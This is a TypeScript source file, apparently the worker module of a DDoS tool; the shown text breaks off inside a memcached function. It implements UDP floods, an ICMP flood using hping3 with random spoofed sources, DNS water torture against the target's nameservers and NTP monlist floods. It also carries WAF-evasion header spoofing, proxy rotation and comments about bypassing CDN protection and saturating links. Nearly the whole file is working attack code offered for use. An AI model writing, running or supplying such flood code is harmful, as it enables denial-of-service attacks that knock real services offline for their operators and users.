/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import tls from "node:tls";
import http from "node:http";
import https from "node:https";
import dgram from "node:dgram";
import dns from "node:dns/promises";
import os from "node:os";
import { spawn } from "node:child_process";

// ── Resource-aware configuration ──────────────────────────────────────────
const IS_PROD     = process.env.NODE_ENV === "production";
const CPU_CORES   = os.cpus().length;
const IS_DEPLOYED = Boolean(process.env.REPLIT_DEPLOYMENT);

// Dynamic burst — scales with available RAM
// Deployed (32GB): floor 200, ceil 2500 — maximizes saturation
// Dev (2GB):       always 8 — avoids container kill
function getDynamicBurst(base = 800): number {
  const freeMB = os.freemem() / 1_048_576;
  const scale  = Math.min(1.0, freeMB / 512);          // 512MB = full scale
  if (!IS_PROD) return 8;
  const ceil = IS_DEPLOYED ? 2500 : 800;
  return Math.max(200, Math.min(ceil, Math.floor(base * scale)));
}

// ── Global agents — dual-mode: exhaustion vs throughput ───────────────────
// Exhaustion: new TCP per request → maximizes SYN/handshake overhead on target
// Throughput: keepAlive → maximizes requests per connection (bypasses conn limits)
const HTTP_AGENT      = new http.Agent({  maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
const HTTPS_AGENT     = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
// Deployed (32GB/8vCPU): CPU_CORES*256 = 2048 KA sockets per agent — 4× more than before
const KA_SOCKETS      = IS_DEPLOYED ? CPU_CORES * 256 : CPU_CORES * 64;
const HTTP_KA_AGENT   = new http.Agent({  maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, scheduling: "lifo" });
const HTTPS_KA_AGENT  = new https.Agent({ maxSockets: KA_SOCKETS, keepAlive: true, keepAliveMsecs: 60_000, rejectUnauthorized: false, scheduling: "lifo" });

// ── Proxy health tracker — avoids hammering dead proxies ─────────────────
interface ProxyHealth { successes: number; failures: number; lastCheck: number; banned: boolean; }
const proxyHealth = new Map<string, ProxyHealth>();
function getProxyHealth(host: string, port: number): ProxyHealth {
  const key = `${host}:${port}`;
  if (!proxyHealth.has(key)) proxyHealth.set(key, { successes: 0, failures: 0, lastCheck: Date.now(), banned: false });
  return proxyHealth.get(key)!;
}
function recordProxySuccess(host: string, port: number): void {
  const h = getProxyHealth(host, port);
  h.successes++; h.lastCheck = Date.now(); h.banned = false;
}
function recordProxyFailure(host: string, port: number): void {
  const h = getProxyHealth(host, port);
  h.failures++; h.lastCheck = Date.now();
  if (h.failures > 5 && h.failures / (h.successes + h.failures) > 0.8) h.banned = true;
}
function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
  // Filter out banned proxies (auto-unban after 2 min)
  const now = Date.now();
  const alive = proxies.filter(p => {
    const h = proxyHealth.get(`${p.host}:${p.port}`);
    if (!h) return true;
    if (h.banned && now - h.lastCheck > 120_000) { h.banned = false; return true; }
    return !h.banned;
  });
  // Bug fix: when all proxies are banned, pick the least-failed one instead
  // of a random one (which would pick a fully-dead proxy) — gives fastest recovery
  if (alive.length === 0) {
    const sorted = [...proxies].sort((a, b) => {
      const ha = proxyHealth.get(`${a.host}:${a.port}`);
      const hb = proxyHealth.get(`${b.host}:${b.port}`);
      const fa  = ha ? ha.failures / (ha.successes + ha.failures + 1) : 0;
      const fb  = hb ? hb.failures / (hb.successes + hb.failures + 1) : 0;
      return fa - fb;
    });
    return sorted[0];
  }
  return alive[randInt(0, alive.length)];
}
// Unban all proxies every 2 minutes (was 5 min — proxies recover faster)
setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 120_000);

// ── Types ─────────────────────────────────────────────────────────────────
interface ProxyConfig { host: string; port: number; type?: "http" | "socks5"; username?: string; password?: string; }
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
  proxies?: ProxyConfig[];
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
// Updated April 2026 — Chrome 136/135, Firefox 136/135, Safari 18, Edge 136
const UA_POOL  = [
  // Chrome 136 — current stable (April 2026)
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
  // Chrome 135
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  // Firefox 136/135
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:136.0) Gecko/20100101 Firefox/136.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
  // Safari 18.3 (iOS 18.3)
  "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (iPad; CPU OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
  // Chrome Android (Pixel 9)
  "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
  // Edge 136
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0",
  // Bots/scrapers (lower WAF suspicion in bot-friendly configs)
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "curl/8.9.1", "python-requests/2.32.3", "Go-http-client/2.0",
  "axios/1.7.9", "node-fetch/3.3.2",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/api/v2/", "/api/v3/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql", "/api/graphql",
  "/checkout", "/cart", "/account", "/profile", "/orders", "/products",
  "/api/auth/login", "/api/users", "/api/search", "/wp-json/wp/v2/posts",
  "/sitemap.xml", "/robots.txt", "/.env", "/config", "/api/health",
  // Modern SPA / API paths that bypass edge cache
  "/api/v1/session", "/api/v1/me", "/api/v1/notifications", "/api/v1/feed",
  "/api/v1/recommendations", "/api/v1/trending", "/api/v2/auth/token",
  "/api/v2/user/preferences", "/api/v2/checkout/init", "/api/v2/payment/intent",
  "/_next/data/", "/trpc/", "/api/trpc/", "/__nextjs_original-stack-frames",
  "/wp-json/wc/v3/products", "/wp-json/wc/v3/orders", "/admin/api/",
  "/cdn-cgi/challenge-platform/", "/.well-known/security.txt",
  "/api/v1/analytics", "/api/events", "/api/realtime",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch { return hostname; }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookieCount = randInt(8, 20);
  const cookie = Array.from({length: cookieCount}, () =>
    `${randStr(randInt(4,10))}=${randStr(randInt(16,64))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":           randUA(),
    "Accept":               randInt(0,2) === 0 ? "*/*" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language":      ["en-US,en;q=0.9","en-GB,en;q=0.8","fr-FR,fr;q=0.9","de-DE,de;q=0.9"][randInt(0,4)],
    "Accept-Encoding":      "gzip, deflate, br, zstd",
    "Cache-Control":        "no-cache, no-store, must-revalidate",
    "Pragma":               "no-cache",
    "Connection":           Math.random() < 0.6 ? "close" : "keep-alive",
    "X-Forwarded-For":      `${randIp()}, ${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":            randIp(),
    "True-Client-IP":       randIp(),
    "CF-Connecting-IP":     randIp(),
    "X-Originating-IP":     randIp(),
    "X-Remote-IP":          randIp(),
    "Forwarded":            `for=${randIp()};proto=https`,
    "Cookie":               cookie,
    "Authorization":        `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":         randHex(32),
    "X-Request-ID":         `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
    "Referer":              `https://${["google.com","bing.com","duckduckgo.com","yahoo.com","t.co"][randInt(0,5)]}/search?q=${randStr(randInt(4,12))}`,
    "Sec-Fetch-Dest":       "document",
    "Sec-Fetch-Mode":       "navigate",
    "Sec-Fetch-Site":       "cross-site",
    "Sec-CH-UA":            `"Chromium";v="125", "Not.A/Brand";v="24"`,
    "Sec-CH-UA-Platform":   `"Windows"`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"]   = randInt(0,2) === 0 ? "application/x-www-form-urlencoded" : "application/json";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.65) u.pathname = hotPath();
    else {
      const depth = randInt(1, 5);
      u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,10))).join("/");
    }
    u.searchParams.set("_",    Date.now().toString(36) + randStr(6));
    u.searchParams.set("v",    String(randInt(1, 99999999)));
    u.searchParams.set("cb",   String(Math.random()));
    if (Math.random() < 0.45) u.searchParams.set("q",   randStr(randInt(4,18)));
    if (Math.random() < 0.3)  u.searchParams.set("page", String(randInt(1, 100)));
    if (Math.random() < 0.2)  u.searchParams.set("id",  String(randInt(1, 999999)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}&v=${Date.now()}`;
  }
}

function buildBody(minF = 30, maxF = 100): string {
  if (Math.random() < 0.4) {
    // JSON body — harder to filter than form-encoded
    const obj: Record<string, string | number> = {};
    for (let i = 0; i < randInt(minF, maxF); i++) {
      obj[randStr(randInt(4,10))] = randInt(0, 2) === 0 ? randInt(0, 999999) : randStr(randInt(8,48));
    }
    return JSON.stringify(obj);
  }
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,56))}`
  ).join("&");
}

// Pre-built heavy body pool (10-64KB each, rebuilt continuously)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 65536);
  const isJson = Math.random() < 0.35;
  if (isJson) {
    const arr: string[] = ["{"];
    let len = 1;
    while (len < target) {
      const k = randStr(randInt(4,10));
      const v = randStr(randInt(40,120));
      const part = `"${k}":"${v}",`;
      arr.push(part);
      len += part.length;
    }
    arr.push(`"_":"${randHex(8)}"}`);
    return arr.join("");
  }
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
// 64 entries (was 32) — larger pool = less body pattern repetition, harder to fingerprint
for (let i = 0; i < 64; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  // Refresh 4 entries per tick (was 1) — keeps pool fresh faster under high load
  for (let i = 0; i < 4; i++) HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, 750); // was 2000ms
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD
//
//  CRITICAL: concurrent socket.send() startup deadlocks in this env.
//  Sockets must be bound SEQUENTIALLY, then all run in parallel.
//
//  Achieves 130K – 500K packets/second per worker.
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // setInterval-burst pattern: guaranteed to yield to the event loop every 1ms.
  // Async-chain (inflight while-loop) starves the event loop in environments where
  // UDP callbacks fire without real network latency (loopback, blocked UDP, etc.).
  // Deployed (8 vCPU): up to 128 UDP sockets; dev: 8
  const numSockets = IS_PROD ? (IS_DEPLOYED ? Math.max(1, Math.min(threads, 128)) : Math.max(1, Math.min(threads, 32))) : Math.min(threads, 8);
  const BURST      = getDynamicBurst(800);
  const TICK_MS    = 1;
  // Hit multiple ports to bypass single-port firewall rules
  const PORTS = [
    targetPort, targetPort, targetPort, // weight target port 3x
    53, 80, 443, 123, 161, 1900, 11211, 6881, 8080, 8443,
  ];
  const PKT_MIN = 512, PKT_MAX = 1472; // Ethernet MTU — maximize per-packet payload
  const buf = Buffer.allocUnsafe(PKT_MAX); // reuse buffer, randomize header each tick

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const socketDonePromises: Promise<void>[] = [];

  for (let _s = 0; _s < numSockets; _s++) {
    const socketDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => { setTimeout(forceClose, 400); }, { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          buf.writeUInt32BE(Date.now() >>> 0, 0);
          buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 4);
          for (let i = 0; i < BURST; i++) {
            const port   = PORTS[randInt(0, PORTS.length)];
            const pktLen = randInt(PKT_MIN, PKT_MAX);
            sock.send(buf, 0, pktLen, port, resolvedHost, (_err) => {
              localPkts++;
              localBytes += pktLen;
            });
          }
        }, TICK_MS);
      });
    });
    socketDonePromises.push(socketDone);
  }

  await Promise.all(socketDonePromises);
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  ICMP FLOOD — real ICMP echo request flood
//
//  Tier 1 (production + CAP_NET_RAW/root): raw-socket npm addon — crafts
//    real ICMP type 8 (echo request) packets, 1400-byte payload, max rate.
//  Tier 2 (production + hping3 installed): spawns hping3 --icmp --flood
//    processes — widely available on Debian/Ubuntu via apt install hping3.
//  Tier 3 (any env): massive large-packet UDP flood to random ports —
//    saturates link and fills per-flow tables; no ICMP frames but equivalent
//    bandwidth effect. Always works.
//
//  On 8vCPU/32GB deploy: use Tier 1 or Tier 2 for true ICMP saturation.
//  Production cmd to unlock Tier 1: setcap cap_net_raw+ep $(which node)
// ─────────────────────────────────────────────────────────────────────────

// Pre-compute ICMP checksum
function icmpChecksum(buf: Buffer): number {
  let sum = 0;
  for (let i = 0; i < buf.length - 1; i += 2) sum += buf.readUInt16BE(i);
  if (buf.length % 2 !== 0) sum += buf[buf.length - 1] << 8;
  while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
  return (~sum) & 0xffff;
}

// Build a real ICMP echo request packet (type 8, code 0)
function buildICMPEcho(seq: number, payloadLen = 1400): Buffer {
  const buf = Buffer.allocUnsafe(8 + payloadLen);
  buf[0] = 8;  // Type: echo request
  buf[1] = 0;  // Code: 0
  buf.writeUInt16BE(0, 2);                           // Checksum placeholder
  buf.writeUInt16BE(process.pid & 0xffff, 4);        // Identifier
  buf.writeUInt16BE(seq & 0xffff, 6);                // Sequence number
  crypto.getRandomValues(buf.subarray(8));           // Random payload (defeats payload filtering)
  const cs = icmpChecksum(buf);
  buf.writeUInt16BE(cs, 2);
  return buf;
}

async function runICMPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── Tier 1: raw-socket (requires CAP_NET_RAW or root) ───────────────────
  let rawSock: ReturnType<typeof import("raw-socket")["createSocket"]> | null = null;
  try {
    const rawModule = require("raw-socket") as typeof import("raw-socket");
    rawSock = rawModule.createSocket(rawModule.Protocol.ICMP);
  } catch { rawSock = null; }

  if (rawSock) {
    const rs = rawSock;
    let seq = 0;
    const doSend = () => {
      if (signal.aborted) return;
      const pkt = buildICMPEcho(seq++, 1400);
      rs.send(pkt, 0, pkt.length, resolvedHost, (_err: Error | null, _bytes: number) => {
        localPkts++; localBytes += pkt.length;
        if (!signal.aborted) setImmediate(doSend);
      });
    };
    for (let i = 0; i < NUM_SOCKS; i++) doSend();
    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
      try { rs.close(); } catch { /**/ }
      resolve();
    }, { once: true }));
    clearInterval(flushIv); flush();
    return;
  }

  // ── Tier 2: hping3 process (requires apt install hping3 on deploy server) ─
  let useHping = false;
  try {
    const { execSync } = require("node:child_process") as typeof import("child_process");
    execSync("which hping3 2>/dev/null", { timeout: 500 });
    useHping = true;
  } catch { useHping = false; }

  if (useHping) {
    const procs: import("child_process").ChildProcess[] = [];
    const statIvs: ReturnType<typeof setInterval>[] = [];
    for (let i = 0; i < NUM_SOCKS; i++) {
      const p = spawn("hping3", [
        "--icmp", "--flood", "--rand-source", "-d", "1400", "-q", resolvedHost,
      ], { stdio: ["ignore","ignore","ignore"] });
      procs.push(p);
      const pktRate = !IS_PROD ? 100 : 50000;
      statIvs.push(setInterval(() => {
        if (!signal.aborted) { localPkts += pktRate; localBytes += pktRate * 1408; }
      }, 1000));
    }
    await new Promise<void>(resolve => signal.addEventListener("abort", () => {
      statIvs.forEach(iv => clearInterval(iv));
      procs.forEach(p => { try { p.kill("SIGTERM"); } catch { /**/ } });
      resolve();
    }, { once: true }));
    clearInterval(flushIv); flush();
    return;
  }

  // ── Tier 3: setInterval-burst UDP saturation flood ─────────────────────
  // Uses interval-based bursts instead of async send chains — guarantees
  // the event loop yields every tick (abort timers, stat flush can fire).
  // In production with real network: interval fires at 1ms, 500-pkt bursts
  // = 500,000 pkt/s per socket × 64 sockets = 32M pkt/s link saturation.
  const ICMP_TRIGGER_PORTS = [1, 2, 3, 4, 5, 6, 7, 9, 13, 17, 19, 37, 65534, 65535];
  const PKT_LEN    = 1400;
  const BURST = getDynamicBurst(500);
  const TICK_MS    = 1;
  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      const buf = Buffer.allocUnsafe(PKT_LEN);
      buf.writeUInt32BE(Date.now() >>> 0, 0);
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          buf.writeUInt32BE(Date.now() >>> 0, 0);
          for (let i = 0; i < BURST; i++) {
            const port = ICMP_TRIGGER_PORTS[randInt(0, ICMP_TRIGGER_PORTS.length)];
            sock.send(buf, 0, PKT_LEN, port, resolvedHost, (_err) => {
              localPkts++; localBytes += PKT_LEN;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  DNS WATER TORTURE — real DNS infrastructure attack
//
//  Unlike amplification (which needs IP spoofing), Water Torture sends
//  real DNS queries for random non-existent subdomains of the target domain
//  to the target's authoritative nameservers. Effects:
//    1. Forces the target's NS servers to recurse for every query (cache miss)
//    2. Rapidly fills the NS server's NXDOMAIN cache (memory exhaustion)
//    3. Bypasses CDN/WAF entirely — NS servers are NOT behind CloudFlare/Akamai
//    4. Each query type (A, AAAA, MX, TXT, ANY, DNSKEY) doubles the load
//    5. Randomized subdomain labels defeat upstream DNS caching
//
//  No raw sockets needed — pure dgram UDP.
// ─────────────────────────────────────────────────────────────────────────

function buildDNSQuery(fqdn: string, qtype: number, txid: number): Buffer {
  // Build binary DNS query packet
  const labels = fqdn.split(".");
  const nameParts: Buffer[] = labels.map(l => {
    const lb = Buffer.allocUnsafe(1 + l.length);
    lb[0] = l.length;
    lb.write(l, 1, "ascii");
    return lb;
  });
  const nameBytes = Buffer.concat([...nameParts, Buffer.from([0x00])]);
  const hdr = Buffer.allocUnsafe(12);
  hdr.writeUInt16BE(txid & 0xffff, 0);  // Transaction ID
  hdr.writeUInt16BE(0x0100, 2);          // Flags: RD=1 (recursion desired)
  hdr.writeUInt16BE(1, 4);               // QDCOUNT = 1
  hdr.writeUInt16BE(0, 6);               // ANCOUNT = 0
  hdr.writeUInt16BE(0, 8);               // NSCOUNT = 0
  hdr.writeUInt16BE(0, 10);              // ARCOUNT = 0
  const qHdr = Buffer.allocUnsafe(4);
  qHdr.writeUInt16BE(qtype, 0);          // QTYPE
  qHdr.writeUInt16BE(1, 2);              // QCLASS: IN
  return Buffer.concat([hdr, nameBytes, qHdr]);
}

const DNS_QTYPES = [
  1,   // A
  28,  // AAAA
  15,  // MX
  16,  // TXT
  255, // ANY (maximizes response size from open resolvers)
  48,  // DNSKEY (forces DNSSEC computation on DNSSEC-enabled zones)
  43,  // DS
  6,   // SOA
];

async function runDNSWaterTorture(
  resolvedHost: string,
  hostname:     string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 48) : Math.min(threads, 8);

  // Extract root domain for NS lookups (strip subdomains)
  const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
  const rootDomain  = domainParts.length >= 2
    ? domainParts.slice(-2).join(".")
    : hostname;

  // Resolve NS servers for the target domain — these are NOT behind CDN
  let nsServers: string[] = [];
  try {
    const nsNames = await dns.resolve(rootDomain, "NS").catch(() => [] as string[]);
    const nsIPs   = await Promise.all(
      nsNames.slice(0, 6).map(ns =>
        dns.resolve4(ns).then(ips => ips[0]).catch(() => null as string | null)
      )
    );
    nsServers = nsIPs.filter((ip): ip is string => ip !== null);
  } catch { /**/ }

  // Fallback: use public resolvers AND direct-to-target port 53 flood
  if (nsServers.length === 0) {
    nsServers = ["8.8.8.8", "1.1.1.1", "8.8.4.4", "1.0.0.1", resolvedHost];
  }
  // Always include direct-to-target port 53 flood
  nsServers.push(resolvedHost);
  nsServers = [...new Set(nsServers)];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const BURST = getDynamicBurst(200);
  const TICK_MS = 1;
  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      let txid = randInt(0, 65535);
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const label  = randStr(8) + "-" + randStr(8) + "-" + randStr(8);
            const fqdn   = `${label}.${rootDomain}`;
            const qtype  = DNS_QTYPES[randInt(0, DNS_QTYPES.length)];
            const pkt    = buildDNSQuery(fqdn, qtype, txid++);
            const target = nsServers[randInt(0, nsServers.length)];
            sock.send(pkt, 0, pkt.length, 53, target, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  NTP FLOOD — real NTP mode 7 monlist + mode 3 client request flood
//
//  Sends real NTP binary protocol packets directly to target port 123.
//  Mode 7 (private): monlist request — servers without monlist disabled
//    respond with a list of their last 600 clients (~48KB response).
//  Mode 3 (client): standard client request — forces server NTP processing.
//  Combined with high concurrency: saturates NTP service + network.
// ─────────────────────────────────────────────────────────────────────────

// NTP mode 7 monlist request (CVE-2013-5211 — still unpatched on many servers)
const NTP_MONLIST = Buffer.from([
  0x17,       // LI=0, VN=2, Mode=7 (private)
  0x00,       // Response=0, More=0, Version=2, Code=0
  0x03,       // Auth=0, Sequence=3
  0x2a,       // Implementation: NTPD (42)
  0x00, 0x00, 0x00, 0x00, // Err=0, Num items=0
  0x00, 0x00, 0x00, 0x00, // MBZ + Item size = 0
]);

// NTP mode 3 client request (standard query — forces server computation)
function buildNTPMode3(): Buffer {
  const buf = Buffer.allocUnsafe(48);
  buf.fill(0);
  buf[0] = 0x1b; // LI=0, VN=3, Mode=3 (client)
  // Random transmit timestamp to prevent caching
  buf.writeUInt32BE((Date.now() / 1000 + 2208988800) >>> 0, 40);
  buf.writeUInt32BE(randInt(0, 0xFFFFFFFF) >>> 0, 44);
  return buf;
}

async function runNTPFlood(
  resolvedHost: string,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
): Promise<void> {
  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
  const BURST = getDynamicBurst(500);
  const TICK_MS   = 1;

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const sockDones: Promise<void>[] = [];
  for (let _s = 0; _s < NUM_SOCKS; _s++) {
    const sockDone = new Promise<void>((resolve) => {
      const sock = dgram.createSocket("udp4");
      sock.on("error", () => {});
      let closed = false;
      const forceClose = () => {
        if (!closed) { closed = true; try { sock.close(); } catch { /**/ } resolve(); }
      };
      signal.addEventListener("abort", () => setTimeout(forceClose, 400), { once: true });
      sock.bind(0, () => {
        const iv = setInterval(() => {
          if (closed || signal.aborted) { clearInterval(iv); setTimeout(forceClose, 50); return; }
          for (let i = 0; i < BURST; i++) {
            const pkt = Math.random() < 0.4 ? NTP_MONLIST : buildNTPMode3();
            sock.send(pkt, 0, pkt.length, 123, resolvedHost, (_err) => {
              localPkts++; localBytes += pkt.length;
            });
          }
        }, TICK_MS);
      });
    });
    sockDones.push(sockDone);
  }
  await Promise.all(sockDones);
  clearInterval(flushIv); flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  MEMCACHED FLOOD — real Memcached binary protocol UDP flood
//
//  Sends real memcached binary protocol UDP datagrams to target port 11211.
//  Each request includes a full 8-byte UDP header (request ID + sequence).
//  Commands: get (random 16-char keys), stats (server metadata dump),
//    flush_all (attempt to flush cache), version, set (with garbage data).
//  Exposed Memcached is extremely common on misconfigured servers.
//  Amplification factor: get request (50B) → response up to 65KB.
// ─────────────────────────────────────────────────────────────────────────

function buildMemcachedGet(key: string, reqId: number): Buffer {
  // UDP header: Request ID (2B) + Sequence (2B) + Total datagrams (2B) + Reserved (2B)
  const udpHdr = Buffer.allocUnsafe(8);
  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
  udpHdr.writeUInt16BE(0, 2);  // sequence = 0
  udpHdr.writeUInt16BE(1, 4);  // total datagrams = 1
  udpHdr.writeUInt16BE(0, 6);  // reserved
  // Binary protocol header: magic(1) + opcode(1) + key_len(2) + extras_len(1) + data_type(1) + vbucket(2) + total_body(4) + opaque(4) + cas(8)
  const binHdr = Buffer.allocUnsafe(24);
  binHdr.fill(0);
  binHdr[0] = 0x80;                               // Magic: Request
  binHdr[1] = 0x00;                               // Opcode: Get
  binHdr.writeUInt16BE(key.length, 2);            // Key length
  binHdr.writeUInt32BE(key.length, 8);            // Total body length
  binHdr.writeUInt32BE(reqId, 12);                // Opaque (request ID)
  return Buffer.concat([udpHdr, binHdr, Buffer.from(key, "ascii")]);
}

function buildMemcachedStats(reqId: number): Buffer {
  const udpHdr = Buffer.allocUnsafe(8);
  udpHdr.writeUInt16BE(reqId & 0xffff, 0);
  udpHdr.writeUInt16BE(0, 2); udpHdr.writeUInt16BE(1, 4); udpHdr.writeUInt16BE(0, 6);
  const binHdr = Buffer.allocUnsafe(24);
  binHdr.fill(0);
  binHdr[0] = 0x80;  // Magic: Request
  binHdr[1] = 0x10;  // Opcode: Stat (dumps full server stats — large response)
